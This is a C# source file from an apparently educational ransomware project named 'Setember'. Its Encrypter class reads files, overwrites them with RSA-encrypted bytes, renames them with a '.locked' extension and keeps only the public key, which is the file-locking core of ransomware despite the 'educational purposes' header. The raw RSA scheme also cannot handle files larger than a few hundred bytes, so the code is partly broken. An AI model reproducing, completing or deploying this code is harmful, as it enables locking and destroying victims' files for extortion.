// 
//   ____ __________ _____ __  __ ____ _____ ____  
//  / ___|___ /_   _|___ /|  \/  | __ )___ /|  _ \ 
//  \___ \ |_ \ | |   |_ \| |\/| |  _ \ |_ \| |_) |
//   ___) |__) || |  ___) | |  | | |_) |__) |  _ < 
//  |____/____/ |_| |____/|_|  |_|____/____/|_| \_\
//                                                 
//
// Copyright (c) 2023 Daniel Aspect
// 
// This file is part of the "Setember" project, licensed under The MIT License.
// 
// THIS SOFTWARE MUST ONLY BE USED FOR EDUCATIONAL PURPOSES!

using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Setember;

public class Encrypter : IDisposable
{
    private RSAParameters Parameters;

    private bool disposedValue;

    private byte[] Encrypt(byte[] plainBytes)
    {
        using (RSA rsa = RSA.Create(Parameters))
        {
            return rsa.Encrypt(plainBytes, RSAEncryptionPadding.OaepSHA512);
        }
    }

    protected internal async Task EncryptFile(string path)
    {
        try
        {
            byte[] fileBytes = await File.ReadAllBytesAsync(path);
            byte[] encryptedBytes = Encrypt(fileBytes);
            await File.WriteAllBytesAsync(path, encryptedBytes);
            File.Move(path, path + ".locked");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"{DateTime.Now}: The file could not be encrypted: {ex}");
        }
    }

    protected internal void GenRSAKeyPair()
    {
        using (RSA rsa = RSA.Create(4096))
        {
            // This method return doesn't include
            // the private key
            Parameters = rsa.ExportParameters(false);
        }
    }

    protected virtual void Dispose(bool disposing)
    {
        if (!disposedValue)
        {
            if (disposing)
            {
                // TODO: dispose managed state (managed objects)
            }

            // TODO: free unmanaged resources (unmanaged objects) and override finalizer
            // TODO: set large fields to null
            disposedValue = true;
        }
    }

    // // TODO: override finalizer only if 'Dispose(bool disposing)' has code to free unmanaged resources
    // ~Encrypter()
    // {
    //     // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
    //     Dispose(disposing: false);
    // }

    public void Dispose()
    {
        // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
        Dispose(disposing: true);
        GC.SuppressFinalize(this);
    }
}